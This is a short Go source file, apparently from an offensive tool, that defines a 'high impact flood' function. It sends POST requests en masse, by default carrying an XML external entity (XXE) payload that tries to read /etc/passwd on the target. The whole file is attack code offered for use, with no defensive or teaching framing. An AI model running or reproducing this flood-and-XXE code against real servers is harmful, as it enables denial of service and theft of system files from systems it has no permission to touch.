package tactics

import "context"

const defaultXXEPayload = `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`

// HFull — high impact flood: kirim payload (default XXE XML) via POST secara masif.
func HFull(ctx context.Context, p Params) (int64, error) {
	body := p.PostData
	if body == "" {
		body = defaultXXEPayload
	}
	cfg := floodConfig{
		httpMethod: "POST",
		body:       body,
		keepAlive:  true,
		headers: map[string]string{
			"Content-Type": "application/xml",
		},
	}
	return runFlood(ctx, p, cfg)
}
